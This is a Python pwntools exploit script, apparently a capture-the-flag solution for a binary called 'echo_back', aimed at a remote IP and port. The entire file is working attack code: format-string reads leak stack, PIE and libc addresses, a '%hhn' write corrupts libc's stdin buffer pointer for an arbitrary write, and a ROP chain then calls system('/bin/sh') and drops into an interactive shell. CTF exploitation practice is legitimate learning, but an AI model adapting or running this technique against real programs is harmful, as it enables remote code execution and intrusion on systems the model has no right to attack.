#coding:utf-8
from pwn import *
from ctypes import *
debug = 1
elf = ELF('./echo_back')

# if debug:
#     p = process('./echo_back')
#     libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#     context.log_level = 'debug'
#     #gdb.attach(p)
# else:
p = remote("111.198.29.45",53911)
#p = process("./echo_back")
libc = ELF('./libc.so.6')
#off = 0x001b0000
context.log_level = 'debug'

def set_name(name):
    p.recvuntil('choice>>')
    p.sendline('1')
    p.recvuntil('name')
    p.send(name)

def echo(content):
    p.recvuntil('choice>>')
    p.sendline('2') 
    p.recvuntil('length:')
    p.sendline('-1')
    p.send(content)

#gdb.attach(p,"b * 0x555555554c50")
echo('%12$p\n')
p.recvuntil('anonymous say:')
stack_addr = int(p.recvline()[:-1],16)
print '[+] stack :',hex(stack_addr)
echo('%13$p\n')
p.recvuntil('anonymous say:')
pie = int(p.recvline()[:-1],16)-0xd08
print '[+] pie :',hex(pie)
echo('%19$p\n')
p.recvuntil('anonymous say:')
libc.address = int(p.recvline()[:-1],16)-240-libc.symbols['__libc_start_main']
print '[+] system :',hex(libc.symbols['system'])
set_name(p64(libc.address + 0x3c4918)[:-1])
echo('%16$hhn')
p.recvuntil('choice>>')
p.sendline('2') 
p.recvuntil('length:')
padding = p64(libc.address+0x3c4963)*3 + p64(stack_addr-0x28)+p64(stack_addr+0x10)
p.send(padding)
p.sendline('')
for i in range(len(padding)-1):
    p.recvuntil('choice>>')
    p.sendline('2') 
    p.recvuntil('length:')
    p.sendline('')


p.recvuntil('choice>>')
p.sendline('2') 
p.recvuntil('length:')
rop = p64(pie+0x0000000000000d93)+p64(next(libc.search('/bin/sh')))+p64(libc.symbols['system'])
p.sendline(rop)
p.sendline('')

p.interactive()
